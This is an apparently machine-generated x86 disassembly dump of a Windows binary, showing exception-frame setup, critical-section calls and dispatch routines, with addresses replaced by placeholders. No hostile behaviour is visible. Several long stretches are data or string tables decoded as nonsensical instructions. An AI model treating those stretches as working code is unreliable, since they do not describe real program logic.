lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4030b4
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_4028cc
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_404100
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413081
lea eax [ ebp - 0x208 ]
call sub_403e9c
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4041a8
sub_4130fc
call [ esp + ebx * 8 + 0x40 ]
add [ eax ] cl
push esi
popad
jb r-xdata
pop es
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_4133b0
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_413330
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_41310c
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41316d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404ee8
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413174
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403164
sub_4131bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_413330
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_4133b0
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_413210
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_413248
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_413330
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_413284
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034d8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4132e7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4132ee
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_413388
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403218
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4133b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_413458
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404ee8
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_413468
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41353e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_413521
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404ef0
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413528
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4030b4
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_404100
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407cd4
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_413558
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4135c7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4135ce
retn
call sub_41310c
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_4050b0
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404918
mov eax rw-data
call sub_403e9c
mov eax rw-data
call sub_40e98c
sub_4135d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_413671
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413678
retn
mov eax rw-data
call sub_4130dc
mov eax sub_40e68c
mov [ rw-data ] eax
mov eax sub_40e230
mov [ rw-data ] eax
mov edx sub_40e140
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40e98c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412dd0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40eca0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_411c68
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412390
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_41367c
push 0xab004616
inc [ eax ]
add [ eax + 0x16 ] ch
inc esi
add [ edi + edi * 8 + 0x16680000 ] ch
inc esi
add [ ebp + 0x680000ff ] ch
push ss
inc esi
add [ esi + 0x680000ff ] ch
push ss
inc esi
add [ edi + 0x680000ff ] ch
push ss
inc esi
add [ eax + 0x680000ff ] dl
push ss
inc esi
add [ ecx + 0x680000ff ] dl
push ss
inc esi
add [ edx + 0x680000ff ] dl
push ss
inc esi
add [ ebx + 0x680000ff ] dl
push ss
inc esi
add [ edi + edi * 8 + 0x16680000 ] dl
inc esi
add [ ebp + 0x680000ff ] dl
push ss
inc esi
add [ esi + 0x680000ff ] dl
push ss
inc esi
add [ edi + 0x680000ff ] dl
push ss
inc esi
add [ eax + 0x680000ff ] bl
push ss
inc esi
add [ ecx + 0x680000ff ] bl
push ss
inc esi
add [ edx + 0x680000ff ] bl
push ss
inc esi
add [ ebx + 0x680000ff ] bl
push ss
inc esi
add [ edi + edi * 8 + 0x16680000 ] bl
inc esi
add [ ebp + 0x680000ff ] bl
push ss
inc esi
add [ esi + 0x680000ff ] bl
push ss
inc esi
add [ edi + 0x680000ff ] bl
push ss
inc esi
add [ eax + 0x680000ff ] al
push ss
inc esi
add [ ecx + 0x680000ff ] al
push ss
inc esi
add [ edx + 0x680000ff ] al
push ss
inc esi
add [ ebx + 0x680000ff ] al
push ss
inc esi
add [ edi + edi * 8 + 0x16680000 ] al
inc esi
add [ ebp + 0x680000ff ] al
push ss
inc esi
add [ esi + 0x680000ff ] al
push ss
inc esi
add [ edi + 0x550000ff ] al
mov ebp esp
xor eax eax
push ebp
push sub_413789
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413790
retn
sub_4137d4
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_413820
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_4137c8
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_407fdc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4137d4
mov edx [ rw-data ]
mov eax esi
call sub_407cd4
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407cd4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_407fdc
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_413884
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_4138f4
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_413968
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_4139c4
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_413a18
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404138
mov ecx esp
mov edx esi
mov eax ebx
call sub_4139c4
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_413a60
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_413a4c
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_413aa0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413ae8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4046c8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_413b24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413aef
lea eax [ ebp - 0x4 ]
call sub_40457c
retn
sub_413af8
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_413a18
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_413a60
pop ebx
retn
dec bl
je r-xdata
call sub_413aa0
jmp r-xdata
pop ebx
retn
sub_413b24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_413bea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404124
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_413af8
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413bf1
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_4045b8
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_413bf8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_4137c8
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_413c40 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_413d6f ]
jmp [ eax * 4 + jump_table_413cdc ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_413e04
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_413df0
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_413e44
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_413e7c
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_413eb8
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_405774
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_413f2c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_413f72
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413f79
retn
mov eax rw-data
call sub_403e9c
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404918
sub_414038
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41405d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414064
retn
sub_41425c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
inc edx
inc ecx
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x43 ] ah
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov ah 0x42
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
or eax 0x72434645
popad
je r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
inc esp
inc ecx
add [ eax + eax ] cl
inc esp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x44
outsd
jb r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax ] al
inc ebx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
inc ecx
add [ eax + eax ] cl
add [ eax ] al
pop eax
inc edx
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
adc [ ebp + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
inc eax
add [ ecx + esi + 0x40 ] dl
add [ eax ] dl
inc ebp
inc esi
sar [ ebx + eax * 2 + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
outsd
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
or al 0x45
push ebx
je r-xdata
add [ ecx + edx ] bh
inc eax
add [ ebp + 0x42a40040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 2 + 0xc0041 ] ah
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x3c ] si
adc [ eax ] eax
lea eax [ eax ]
movsb [ edi ] [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 2 + 0xc0041 ] bh
add [ eax ] al
mov ah 0x42
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
or eax [ ebp + 0x46 ]
dec edi
jo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
inc ebp
inc ecx
add [ eax + eax ] cl
add [ eax ] al
pop eax
outsd
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
or al 0x45
push edx
jae r-xdata
add [ eax ] al
inc ebp
jb r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
pop eax
outsd
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
or al [ ebp + 0x4c ]
add [ eax ] al
dec esi
outsd
je r-xdata
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ ebx ] cl
inc ebp
inc esi
add [ eax ] al
enter 0x4143 0x0
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
or eax [ ebp + 0x57 ]
jb r-xdata
les eax [ ecx + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
